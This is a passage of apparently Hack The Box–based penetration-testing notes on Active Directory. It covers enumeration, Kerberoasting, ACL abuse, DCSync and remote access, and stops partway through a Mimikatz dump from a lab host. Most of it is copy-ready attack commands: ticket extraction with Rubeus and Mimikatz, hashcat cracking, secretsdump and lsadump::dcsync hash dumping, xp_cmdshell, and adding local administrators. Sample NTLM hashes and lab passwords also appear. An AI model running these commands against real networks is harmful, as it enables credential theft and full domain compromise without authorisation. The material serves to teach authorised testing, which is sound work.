| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

#### Quick WMI checks

| **Command**                                                  | **Description**                                              |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`      | Prints the patch level and description of the Hotfixes applied |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list |
| `wmic process list /format:list`                             | A listing of all processes on host                           |
| `wmic ntdomain list /format:list`                            | Displays information about the Domain and Domain Controllers |
| `wmic useraccount list /format:list`                         | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                               | Information about all local groups                           |
| `wmic sysaccount list /format:list`                          | Dumps information about any system accounts that are being used as service accounts. |

#### Table of Useful Net Commands

| **Command**                                     | **Description**                                              |
| ----------------------------------------------- | ------------------------------------------------------------ |
| `net accounts`                                  | Information about password requirements                      |
| `net accounts /domain`                          | Password and lockout policy                                  |
| `net group /domain`                             | Information about domain groups                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                               |
| `net groups /domain`                            | List of domain groups                                        |
| `net localgroup`                                | All available groups                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                   |
| `net share`                                     | Check current shares                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain               |
| `net user /domain`                              | List all users of the domain                                 |
| `net user %username%`                           | Information about the current user                           |
| `net use x: \computer\share`                    | Mount the share locally                                      |
| `net view`                                      | Get a list of computers                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                        |
| `net view \computer /ALL`                       | List shares of a computer                                    |
| `net view /domain `                             | List of PCs of the domain                                    |

# Cooking with Fire

## Kerberoasting - from Linux

**Tools:**

- [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- hashcat

**Commands:**

GetUserSPNs.py - All users:

```bash
GetUserSPNs.py '{DOMAIN}/{USER}:{PASS}' -dc-ip {IP} -request -outputfile kerberoasting.txt
```

GetUserSPNs.py - Single user:

```bash
GetUserSPNs.py '{DOMAIN}/{USER}:{PASS}' -dc-ip {IP} -request-user {USER} -outputfile kerberoasting.txt
```

Netexec:

```bash
nxc ldap {IP} -u {USER} -p {PASS} --kerberoasting output.txt
```

hashcat:

```bash
hashcat -m 13100 kerberoasting.txt {WORDLIST}
```

## Kerberoasting - from Windows

**Tools:**

- Setspn.exe
- Add-Type and New-Object
- Mimikatz
- kirbi2john.py
- hashcat
- Powerview
- Rubeus

**Commands:**

Setspn.exe  - Enumerate SPNs: 

```cmd
setspn.exe -Q */*
```

Setspn.exe - Retrieve All Tickets:

```cmd
setspn.exe -T {DOMAIN} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Add-Type and New-Object (request TGS tickets for an account in the shell above and load them into memory):

```Powershell
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{SPN}"
Example: PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

Mimikatz - Extract Tickets from Memory (base64):

```cmd
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

**NOTE:** Use this command if you extract in b64 to remove line breaks: `echo "<base64 ticket>" |  tr -d \\n > encoded_file`

Placing the Output into a File as .kirbi:

```bash
cat encoded_file | base64 -d > file.kirbi
```

Extracting the Kerberos Ticket using kirbi2john.py:

```bash
kirbi2john.py file.kirbi
```

hashcat:

```bash
hashcat -m 13100 {FILE} {WORDLIST}
```

Mimikatz - Extract Tickets from Memory: 

```cmd
mimikatz # kerberos::list /export
```

Extracting the Kerberos Ticket using kirbi2john.py:

```bash
kirbi2john.py file.kirbi
```

hashcat:

```bash
hashcat -m 13100 {FILE} {WORDLIST}
```

PowerView - Extract TGS Tickets:

```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> Get-DomainUser * -spn | select samaccountname
PS C:\> Get-DomainUser -Identity {SPN_USER} | Get-DomainSPNTicket -Format Hashcat
```

PowerView - Extract All TGS Tickets to a CSV file:

```powershell
PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\file.csv -NoTypeInformation
```

Rubeus.exe - Kerberoasting Info:

```powershell
PS C:\> .\Rubeus.exe kerberoast /stats
```

Rubeus.exe - Filter and retrieve admin accounts:

```powershell
PS C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

**NOTE:** Use `/nowrap` to print the ticket in one single line.

Rubeus.exe - Specify an user account:

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:{USER} /nowrap
```

Rubeus.exe - Specify SPN:

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /spn:"{SPN}" /nowrap
```

# An ACE in the Hole

## Access Control List (ACL) Abuse Primer

### Access Control List (ACL) Overview

In their simplest form, ACLs are lists that define a) who has access  to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called `Access Control Entries` (`ACEs`). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every  object has an ACL, but can have multiple ACEs because multiple security  principals can access objects in AD. ACLs can also be used for auditing  access within AD.

There are two types of ACLs:

1. `Discretionary Access Control List` (`DACL`) -  defines which security principals are granted or denied access to an  object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL  for the level of access that is permitted. If a DACL does not exist for  an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
2. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.

### Access Control Entries (ACEs)

As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a  given securable object. There are `three` main types of ACEs that can be applied to all securable objects in AD:

| **ACE**              | **Description**                                              |
| -------------------- | ------------------------------------------------------------ |
| `Access denied ACE`  | Used within a DACL to show that a user or group is explicitly denied access to an object |
| `Access allowed ACE` | Used within a DACL to show that a user or group is explicitly granted access to an object |
| `System audit ACE`   | Used within a SACL to generate audit logs when a user or group  attempts to access an object. It records whether access was granted or  not and what type of access occurred |

Each ACE is made up of the following `four` components:

1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects  can inherit the given ACE entry from the primary or parent object
4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object

### Why are ACEs Important?

Attackers utilize ACE entries to either further access or establish  persistence. These can be great for us as penetration testers as many  organizations are unaware of the ACEs applied to each object or the  impact that these can have if applied incorrectly. They cannot be  detected by vulnerability scanning tools, and often go unchecked for  many years, especially in large and complex environments. During an  assessment where the client has taken care of all of the "low hanging  fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us  to move laterally/vertically and even achieve full domain compromise.  Some example Active Directory object security permissions are as  follows. These can be enumerated (and visualized) using a tool such as  BloodHound, and are all abusable with PowerView, among other tools:

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`

In this module, we will cover enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:

- [ForceChangePassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword) - gives us the right to reset a user's password without first knowing  their password (should be used cautiously and typically best to consult  our client before resetting passwords).
- [GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite) - gives us the right to write to any non-protected attribute on an  object. If we have this access over a user, we could assign them an SPN  and perform a Kerberoasting attack (which relies on the target account  having a weak password set). Over a group means we could add ourselves  or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based  constrained delegation attack which is outside the scope of this module.
- `AddSelf` - shows security groups that a user can add themselves to.
- [GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group  membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain  local admin access to the machine which may aid us in lateral movement  or privilege escalation in the domain if we can obtain privileged  controls or gain some sort of privileged access.

![image](https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png)

## ACL Enumeration

**Tools:**

- PowerView
- Bloodhound

**Commands:**

Find-InterestingDomainAcl - Enumerate ALL ACLs (extremely time-consuming and likely inaccurate):

```powershell
PS C:\> Find-InterestingDomainAcl
```

Get-DomainObjectACL - Enumerate a specific object and retrieve GUID value from "ObjectAceType" (GUID):

```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> $sid = Convert-NameToSid {OBJECT}
PS C:\> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

Example:

PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```

**NOTE:** In the example above, the GUID is "00299570-246d-11d0-a768-00aa006e0529". With the GUID, we can search the value on google or perform a reverse search using the command below.

Performing a Reverse Search & Mapping to a GUID Value:

```powershell
PS C:\htb> $guid= "{GUID}"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Example:

PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

Get-DomainObjectACL - Enumerate a specific object and retrieve GUID value from "ObjectAceType" (Human-Readable):

```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> $sid = Convert-NameToSid {OBJECT}
PS C:\> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

Example:

PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

## ACL Abuse Tactics

**Tools:**

- [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0)
- [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

**Commands:**

 [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) - opening a PowerShell console and authenticating as another user:

```powershell
PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\{USER}', $SecPassword) 
```

## DCSync

**Tools:**

- secretsdump.py
- Mimikatz
- Invoke-DCSync

**Commands:**

secretsdump.py:

```bash
secretsdump.py -outputfile FILE.TXT -just-dc '{DOMAIN}/{USER}:{PASS}@{IP}'
```

**NOTE:** The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

Mimikatz:

```powershell
PS C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:{DOMAIN}
```

Mimikatz - Specify user:

```powershell
PS C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:{USER}
```

# Stacking The Deck

## Privileged Access

Once we gain a foothold in the domain, our goal shifts to advancing  our position further by moving laterally or vertically to obtain access  to other hosts, and eventually achieve domain compromise or some other  goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an  account with local admin rights over a host, or set of hosts, we can  perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.

**But what if we don't yet have local admin rights on any hosts in the domain?**

There are several other ways we can move around a Windows domain:

- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM)  access, is a remote access protocol that allows us to run commands or  enter an interactive command-line session on a remote host using  PowerShell
- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute  queries against the database. This access can be used to run operating  system commands in the context of the SQL Server service account through various methods

We can enumerate this access in various ways. The easiest, once  again, is via BloodHound, as the following edges exist to show us what  types of remote access privileges a given user has:

- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

We can also enumerate these privileges using tools such as PowerView and even built-in tools.

**Tools:**

- mssqlclient.py
- evil-winrm
- PowerUpSQL.ps1
- [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)

**Commands:**

Get-NetLocalGroupMember - Enumerating the Remote Desktop Users Group: 

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

Get-NetLocalGroupMember - Enumerating the Remote Management Users Group:

```powershell
Get-NetLocalGroupMember -ComputerName {COMPUTER} -GroupName "Remote Management Users"
```

Enter-PSSession - WinRM from Windows:

```powershell
PS C:\> $password = ConvertTo-SecureString "{PASS}" -AsPlainText -Force
PS C:\> $cred = new-object System.Management.Automation.PSCredential ("{USER}", $password)
PS C:\> Enter-PSSession -ComputerName {COMPUTER} -Credential $cred

Example:
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb>
```

evil-winrm - WinRM from Linux:

```bash
evil-winrm -i {IP} -u {USER} -p {PASS}
```

Get-SQLInstanceDomain - Enumerating MSSQL Instances with PowerUpSQL:

```powershell
PS C:\>  Import-Module .\PowerUpSQL.ps1
PS C:\>  Get-SQLInstanceDomain

Example:
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

Get-SQLQuery - Run SQL quey:

```powershell
PS C:\>  Get-SQLQuery -Verbose -Instance "{IP},1433" -username "{USER}" -password "{PASS}" -query '{QUERY}'

Example:
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

mssqlclient.py - Connect to a target:

```bash
mssqlclient.py "{DOMAIN}/{USER}:{PASS}@{IP}"
```

mssqlclient.py - Run a command:

```bash
mssqlclient.py "{DOMAIN}/{USER}:{PASS}@{IP}"

SQL> enable_xp_cmdshell
xp_cmdshell {COMMAND}
```

**Extras:**

Bloodhound custom query - Find "CanPSRemote" (Find WinRM Users):

```bash
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

Bloodhound custom query - Find "SQLAdmin" (Find  SQL Admin Rights):

```bash
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

## Kerberos "Double Hop" Problem

There's an issue known as the "Double Hop" problem that arises when  an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific  resources. Kerberos tickets should not be viewed as passwords. They are  signed pieces of data from the KDC that state what resources an account  can access. When we perform Kerberos authentication, we get a "ticket"  that permits us to access the requested resource (i.e., a single  machine). On the contrary, when we use a password to authenticate, that  NTLM hash is stored in our session and can be used elsewhere without  issue.

------

### Background

The "Double Hop" problem often occurs when using WinRM/Powershell  since the default authentication mechanism only provides a ticket to  access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote  shell. In this situation, the user account being used has the rights to  perform an action but is denied access. The most common way to get  shells is by attacking an application on the target host or using  credentials and a tool such as PSExec. In both of these scenarios, the  initial authentication was likely performed over SMB or LDAP, which  means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of  authentication, such as WinRM, or would prefer to use WinRM for any  number of reasons.

The crux of the issue is that when using WinRM to authenticate over  two or more connections, the user's password is never cached as part of  their login. If we use Mimikatz to look at the session, we'll see that  all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for  authentication. When password authentication is used, with PSExec, for  example, that NTLM hash is stored in the session, so when we go to  access another resource, the machine can pull the hash from memory and  authenticate us.

Let's take a quick look. If we authenticate to the remote host via  WinRM and then run Mimikatz, we don't see credentials for the `backupadm` user in memory.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```powershell-session
PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 45177 (00000000:0000b079)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 1284107 (00000000:0013980b)
Session           : Interactive from 1
User Name         : srvadmin
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/28/2022 3:46:05 PM
SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70669 (00000000:0001140d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 45178 (00000000:0000b07a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 44190 (00000000:0000ac9e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               :
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DEV01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1284140 (00000000:0013982c)
Session           : Interactive from 1
User Name         : srvadmin
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/28/2022 3:46:05 PM
SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : srvadmin
